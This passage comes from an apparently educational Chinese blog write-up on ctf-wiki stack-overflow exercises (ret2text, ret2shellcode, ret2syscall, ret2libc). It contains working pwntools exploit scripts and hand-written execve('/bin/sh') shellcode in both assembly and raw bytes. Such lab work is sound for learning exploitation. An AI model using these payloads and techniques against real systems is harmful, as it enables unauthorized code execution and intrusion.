class="number">0x04</span>) + p32(<span class="number">0x080492EE</span>)</span><br><span class="line">    c2yb8er.recvuntil(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>)</span><br><span class="line">    c2yb8er.sendline(payload)</span><br><span class="line">    c2yb8er.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>结果如下：<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.5qk4718yy6tc.webp"></p><p>并没有打通，这并不是说明我们的payload有什么大问题，而可能是静态调试的弊端，即一些gadgets的地址是不准确的，这时候我们就要使用动态调试。</p><h4 id="方法二：pwndbg动态寻址"><a href="#方法二：pwndbg动态寻址" class="headerlink" title="方法二：pwndbg动态寻址"></a>方法二：pwndbg动态寻址</h4><p>​    首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.62plbdh2jybk.webp"></p><p>​    可以看到该字符串最后的地址就相当于eax此时的地址，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：</p><table><thead><tr><th align="center">eax（s）</th><th align="center">0xffffcf8c</th></tr></thead><tbody><tr><td align="center"><strong>ebp</strong></td><td align="center"><strong>0xffffcff8</strong></td></tr><tr><td align="center"><strong>padding（s与ebp）</strong></td><td align="center"><strong>0x6C</strong></td></tr><tr><td align="center"><strong>padding（s与eip）</strong></td><td align="center"><strong>0x6C+4</strong></td></tr></tbody></table><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.2xl7wagoli4g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    c2yb8er = process(<span class="string">&quot;./ret2text&quot;</span>)  </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">0x04</span>) + p32(<span class="number">0x080492EE</span>)</span><br><span class="line">    c2yb8er.recvuntil(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>)</span><br><span class="line">    c2yb8er.sendline(payload)</span><br><span class="line">    c2yb8er.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>​    其实如果只是ret2text这里是可以打通的。</p><p>​    然后我猛地发现，这偏移不就是我在ida里面的到的偏移么？为什么打不通？？？又到了折磨的找bug环节。</p><h4 id="寻找BUG"><a href="#寻找BUG" class="headerlink" title="寻找BUG"></a>寻找BUG</h4><p>感谢HJY哥哥的DEBUG，我后面再慢慢消化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/ret2text&#x27;</span>)</span><br><span class="line">payload = p32(<span class="number">0x08049296</span>)*<span class="number">25</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc.rand()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.17qulagpzucg.webp"></p><p>成功拿到flag</p><h4 id="本应如此"><a href="#本应如此" class="headerlink" title="本应如此"></a>本应如此</h4><p>  一开始是因为ctf-wiki上的题目需要挂梯子才能下载，我懒得挂梯子所以才会拿原题的源码去自己编译生成，后面我自己挂了梯子，去下了原文件开始解题。</p><p>​    同样的对于<strong>方法一ida静态调试</strong></p><p>​    payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/wiki原题目/ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x64</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.1w8w1ucnscbk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.10jzkb76k2sw.webp"></p><p>​    但是结果是没跑通然后我们pwndbg动态调试一下看看</p><p>​    断点下在<code>080486AE</code>处，即是：<code>b *0x080486AE</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.12ckw1lgf2sg.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.6keggnaebjls.webp"></p><table><thead><tr><th align="center">esp</th><th align="center">0xffffcf50</th></tr></thead><tbody><tr><td align="center"><strong>s=esp+0x1C</strong></td><td align="center"><strong>0xffffcf6c</strong></td></tr><tr><td align="center"><strong>ebp</strong></td><td align="center"><strong>0xffffcfd8</strong></td></tr><tr><td align="center"><strong>padding(s-ebp)</strong></td><td align="center"><strong>0x6c</strong></td></tr><tr><td align="center"><strong>padding(s-ret)</strong></td><td align="center"><strong>0x6c+4</strong></td></tr></tbody></table><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/wiki原题目/ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.6ux1ulfsram8.webp"></p><p>​    得到flag！</p><h3 id="3-ret2shellcode"><a href="#3-ret2shellcode" class="headerlink" title="3.ret2shellcode"></a>3.ret2shellcode</h3><p>​    <strong>ret2shellcode，即控制程序执行 shellcode 代码。</strong>shellcode 指的是<strong>用于完成某个功能的汇编代码</strong>，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p><p>​    在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，<strong>shellcode 所在的区域具有可执行权限。</strong></p><h4 id="编写shellcode的方法"><a href="#编写shellcode的方法" class="headerlink" title="编写shellcode的方法"></a>编写shellcode的方法</h4><ol><li><strong>利用pwntools的shellcraft模块。</strong></li></ol><p>​        <mark>记得用context设置架构，不然容易报错:</mark></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>/<span class="string">&#x27;i386&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.sh() <span class="comment">#.sh()就是调用能够满足提权的shellcode,这样返回的是汇编指令</span></span><br><span class="line"><span class="comment"># 要将其转化为机器码</span></span><br><span class="line">shellcode = asm(shellcode)  </span><br></pre></td></tr></table></figure> <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br></pre></td></tr></table></figure><p>其结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line"> /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line"> push 0x68</span><br><span class="line"> push 0x732f2f2f</span><br><span class="line"> push 0x6e69622f</span><br><span class="line"> mov ebx, esp</span><br><span class="line"> /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line"> /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line"> push 0x1010101</span><br><span class="line"> xor dword ptr [esp], 0x1016972</span><br><span class="line"> xor ecx, ecx</span><br><span class="line"> push ecx /* null terminate */</span><br><span class="line"> push 4</span><br><span class="line"> pop ecx</span><br><span class="line"> add ecx, esp</span><br><span class="line"> push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line"> mov ecx, esp</span><br><span class="line"> xor edx, edx</span><br><span class="line"> /* call execve() */</span><br><span class="line"> push SYS_execve /* 0xb */</span><br><span class="line"> pop eax</span><br><span class="line"> int 0x80</span><br><span class="line"> </span><br><span class="line">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span><br><span class="line">44</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>手动编写更精简的shellcode，有时题目限制了size，就需要自己编写。</strong><ul><li>由上面我程序我们可以发现，利用shellcraft生成的提权shellcode的机器码总共有44个字节，当某些题目填充不了44个字节的时候我们就需要自己手动地去编写更精细的shellcode。</li></ul></li></ol><ol start="3"><li><p><strong>64位精简shellcode的编写</strong></p><ul><li>由于64位采用的是寄存器传参，如果我们要控制参数就必须控制相应的寄存器。</li><li>64位传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9。多余的参数和32位一样，被压入栈中。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">######################################################################</span><br><span class="line">## 64位linux下，默认前6个参数都存入寄存器，所以这里没的说也使用寄存器 </span><br><span class="line">## 寄存器存储参数顺序，参数从左到右：rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"></span><br><span class="line">rdi = /bin/sh        ## 第一个参数</span><br><span class="line">rsi = 0              ## 第二个参数 </span><br><span class="line">rdx = 0              ## 第三个参数 </span><br><span class="line">rax = 0x3b           ## 64位下的系统调用号</span><br><span class="line">syscall              ## 64位使用 syscall</span><br><span class="line">#####################################################################</span><br><span class="line"></span><br><span class="line">## 精炼版本</span><br><span class="line">##</span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，64位中需要一行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line"></span><br><span class="line">    mov rbx, 0x68732f6e69622f  </span><br><span class="line">    push rbx</span><br><span class="line">    push rsp </span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi               </span><br><span class="line">    xor edx, edx             </span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ## 汇编之后字节长度为22字节</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕了很大的圈子，没曾想可以直接这样生成，积累经验！</span></span><br><span class="line"><span class="comment"># 用shellcode相关的pwntools千万不要忘记设置架构！</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rbx, 0x68732f6e69622f  </span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp </span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi               </span></span><br><span class="line"><span class="string">xor edx, edx             </span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></li><li><p><strong>32位精简shellcode的编写</strong></p><ul><li><p>采用栈传参：直接将参数入栈，而且是按照参数顺序从右向左依次入栈。</p><blockquote><p> 32位传参规则</p><p> 调用函数地址–&gt; 返回参数 –&gt; 参数1 –&gt;  参数2 –&gt;  …</p></blockquote><p>Payload传递形式：p32(call_vuln)+p32(ret_addr)+p32(参数1)+p32(参数2)+p32(参数3)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#########################################################################</span><br><span class="line">## 一般函数调用参数是压入栈中，这里系统调用使用寄存器</span><br><span class="line">## 需要对如下几个寄存器进行设置，可以比对官方的实现</span><br><span class="line"></span><br><span class="line">  ebx = /bin/sh     ## 第一个参数</span><br><span class="line">  ecx = 0             ## 第二个参数</span><br><span class="line">  edx = 0             ## 第三个参数</span><br><span class="line">  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号</span><br><span class="line">  int 0x80            ## 执行系统中断</span><br><span class="line">######################################################################### </span><br><span class="line"></span><br><span class="line">## 更精炼的汇编代码</span><br><span class="line">## </span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，32位中需要两行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line"></span><br><span class="line">push 0x68732f        # 0x68732f --&gt; hs/     little endian</span><br><span class="line">push 0x6e69622f      # 0x6e69622f --&gt; nib/  little endian</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov al, 0xb          # al为eax的低8位</span><br><span class="line">int 0x80</span><br><span class="line">## 汇编之后字节长度为20字节</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕了很大的圈子，没曾想可以直接这样生成，积累经验！</span></span><br><span class="line"><span class="comment"># 用shellcode相关的pwntools千万不要忘记设置架构！</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb          </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></li></ol><h4 id="Ctf-Wiki例题"><a href="#Ctf-Wiki例题" class="headerlink" title="Ctf-Wiki例题"></a>Ctf-Wiki例题</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4xsdgadp0268.webp"></p><p>​    几乎啥都没开，拖进IDA看看：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.5sibki1oncw0.webp"></p><p>​    可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.100vw3i4rsts.webp"></p><p>​    由上面的知识我们可知：bss段可读可写不一定可以执行。我们动调利用<code>vmmap</code>看看其权限</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.30v9zwfslgxs.webp"></p><p>​    <code>R W - P</code>  说明其不可以执行，这与wiki原题上的做法不同。这时候我们就要想到<a class="link" href="https://blog.csdn.net/qq_15762939/article/details/104062307">mprotect函数<i class="fas fa-external-link-alt"></i></a>：其可以修改一个进程的属性(RWX)，在我的另一篇博文中略有提到：<a href="http://c2yb8er.cn/2023/01/10/Pwnd0/">点击此处查看</a></p><p>​    这里留下一个大坑：<code>利用mprotect函数修改bss段的权限</code></p><p>​    在哪利用？如何利用？怎么实现？等我再往下学学再来试试。</p><h3 id="4-ret2syscall"><a href="#4-ret2syscall" class="headerlink" title="4.ret2syscall"></a>4.ret2syscall</h3><p>​    ret2syscall，即控制程序执行系统调用，获取 shell。</p><p>​    x86 通过 int 0x80 指令进行系统调用、x64 通过 syscall 指令进行系统调用</p><h4 id="ROPgadget和ropper的食用指南（没有开启PIE保护）"><a href="#ROPgadget和ropper的食用指南（没有开启PIE保护）" class="headerlink" title="ROPgadget和ropper的食用指南（没有开启PIE保护）"></a>ROPgadget和ropper的食用指南（没有开启PIE保护）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot; | grep &#x27;xxx&#x27;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --sting &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">ropper</span><br><span class="line"></span><br><span class="line">file 文件名</span><br><span class="line"></span><br><span class="line">seach xxx</span><br></pre></td></tr></table></figure><h4 id="32位ret2syscall"><a href="#32位ret2syscall" class="headerlink" title="32位ret2syscall"></a>32位ret2syscall</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2syscall&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int0x80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int0x80])</span><br><span class="line">c.sendline(payload)</span><br></pre></td></tr></table></figure><blockquote><p>在Linux的32位下，控制：<br>eax = 0xb // 11<br>ebx = bin_sh_addr  <mark>前提是源文件当中本来就有了”/bin/sh”的地址</mark><br>ecx = 0<br>edx = 0<br>再执行int 0x80指令<br>即可执行：execve(“/bin/sh”, NULL, NULL)，获得到shell</p></blockquote><p>​    32位传参规则在32位下精密编写shellcode已经介绍，不再赘述。</p><h4 id="64位ret2syscall"><a href="#64位ret2syscall" class="headerlink" title="64位ret2syscall"></a>64位ret2syscall</h4><p>​    64位传参规则在64位下精密编写shellcode已经介绍，不再赘述。</p><blockquote><p>在Linux的64位下，控制：<br>rax = 0x3b // 59<br>rdi = bin_sh_addr<br>rsi = 0<br>rdx = 0<br>再执行syscall指令即可执行：execve(“/bin/sh”, NULL, NULL)，获得到shell</p></blockquote><p>​    基本流程：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230114/%E5%9B%BE%E7%89%871.4cv0x5omsi68.webp"></p><h3 id="5-ret2libc1"><a href="#5-ret2libc1" class="headerlink" title="5.ret2libc1"></a>5.ret2libc1</h3><p>​    <strong>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。</strong>一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><blockquote><ol><li><p>libc:Linux下的ANSI C的函数库</p></li><li><p>PLT: 程序链接表（PLT，Procedure Link Table）</p></li><li><p>GOT: 全局偏移表（GOT, Global Offset Table）</p></li><li><p>需要存放外部函数的数据段 —— PLT</p><p>获取数据段存放函数地址的一小段额外代码 —— GOT</p></li><li><p>PLT属于代码段，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能发生变化的是GOT表。</p></li></ol><p>贴几个学习plt表和got表的链接，我目前感觉有点云里雾里：</p><ol><li><a class="link" href="https://www.cnblogs.com/welkinchan/p/11186339.html">PLT与GOT<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://blog.csdn.net/farmwang/article/details/73556017">plt和got<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://baijiahao.baidu.com/s?id=1663915740492408592&wfr=spider&for=pc">深入理解PLT表和GOT表<i class="fas fa-external-link-alt"></i></a></li></ol></blockquote><p>​    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc1 -有/bin/sh，有system-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc1&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    这里我对system函数的压入参数存在疑惑：</p><blockquote><p>我自己理解的是如果调用system函数的话栈里面先把system的参数入栈然后压入system函数的返回地址，然后再压ebp，再压局部变量。但是payload这样做不就说明是先压的返回地址再压的参数。<mark>先放在这里后面再来解决</mark></p></blockquote><h3 id="6-ret2libc2"><a href="#6-ret2libc2" class="headerlink" title="6.ret2libc2"></a>6.ret2libc2</h3><p>​    没有<code>/bin/sh</code>就自己利用现有输入函数例如<code>gets函数</code>写在可写区域。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary ret2libc2 --only &#x27;pop|ret&#x27;</span></span><br><span 